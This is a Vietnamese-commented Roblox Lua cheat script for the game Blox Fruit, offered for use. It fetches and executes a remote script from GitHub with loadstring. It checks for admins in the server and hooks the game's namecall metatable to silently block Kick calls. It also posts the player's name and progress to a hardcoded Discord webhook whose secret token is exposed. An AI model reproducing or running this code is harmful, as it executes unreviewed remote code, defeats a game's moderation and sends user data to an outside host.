--[[ 
    📊 BÁO CÁO TIẾN ĐỘ BLOX FRUIT + KIỂM TRA AN TOÀN
    - Người thực hiện: Quân (quanbinhthuong)
    - Tính năng: Tự động chạy Tumadam, Check Mastery, Check Admin & Anti-Ban
--]]

local WebhookURL = "https://discord.com/api/webhooks/1434363905282412645/QM39tDfX8_b8Fudhg868GNMfVJXQtX6Cm7IRDui71q8-VnyNUDo3cMe2qxc1t5zrIFxq"
local ScriptTumadam = "https://raw.githubusercontent.com/TumadamMod/cwertyur/refs/heads/main/TumadamEng.lua"

-- 1. CHẠY SCRIPT TUMADAM NGẦM
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet(ScriptTumadam))()
    end)
end)

-- 2. HỆ THỐNG KIỂM TRA AN TOÀN (ANTI-KICK/BAN)
if not game:IsLoaded() then game.Loaded:Wait() end

local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

local function CheckSafety()
    local status = "An Toàn ✅"
    
    -- Kiểm tra Admin trong Server
    for _, v in pairs(Players:GetPlayers()) do
        if v:GetRankInGroup(2830050) > 100 then 
            status = "CẢNH BÁO: CÓ ADMIN! ⚠️"
            break
        end
    end
    
    -- Kiểm tra các nỗ lực Kick/Ban (Logic giả lập bảo vệ)
    local mt = getrawmetatable(game)
    if mt then
        setreadonly(mt, false)
        local old = mt.__namecall
        mt.__namecall = newcclosure(function(self, ...)
            local method = getnamecallmethod()
            if method == "Kick" or method == "kick" then
                status = "PHÁT HIỆN LỆNH KICK! 🚫 (Đã chặn)"
                return nil
            end
            return old(self, ...)
        end)
    end
    
    return status
end

-- 3. HÀM LẤY MASTERY
local function GetMasteryDisplay()
    local char = lp.Character
    if char then
        local tool = char:FindFirstChildOfClass("Tool")
        if tool then
            local lvl = tool:FindFirstChild("Level") or tool:FindFirstChild("Mastery")
            if lvl then
                return "\n⚔️ **Mastery " .. tool.Name .. "**: " .. tostring(lvl.Value)
            end
        end
    end
    return ""
end

-- 4. GỬI BÁO CÁO (Giao diện chuẩn image_10011d.png)
local function SendProgressReport()
    local masteryText = GetMasteryDisplay()
    local safetyStatus = CheckSafety()
    
    local data = {
        ["content"] = "Người chơi: **" .. lp.Name .. "**",
        ["embeds"] = {{
            ["title"] = "📊 BÁO CÁO TIẾN ĐỘ BLOX FRUIT",
            ["description"] = "🆙 **LEVEL UP!**\nBạn vừa tăng: **1** level.\nCấp độ mới: **" .. tostring(lp.Data.Level.Value) .. "**" .. masteryText .. "\n🛡️ **Tình trạng**: " .. safetyStatus .. "\n\nThời gian: **" .. os.date("%X") .. "**",
            ["color"] = 3066993,
        }}
    }

    local req = (syn and syn.request) or (http and http.request) or request or http_request
    if req then
        pcall(function()
            req({
                Url = WebhookURL, 
                Method = "POST", 
                Headers = {["Content-Type"] = "application/json"}, 
                Body = HttpService:JSONEncode(data)
            })
        end)
    end
end

SendProgressReport()
